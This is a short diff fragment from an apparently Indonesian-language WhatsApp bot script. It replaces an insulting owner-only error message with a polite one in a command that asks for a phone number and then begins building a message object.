 case 'kigasstik':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 adehvn = { 
         key: { 
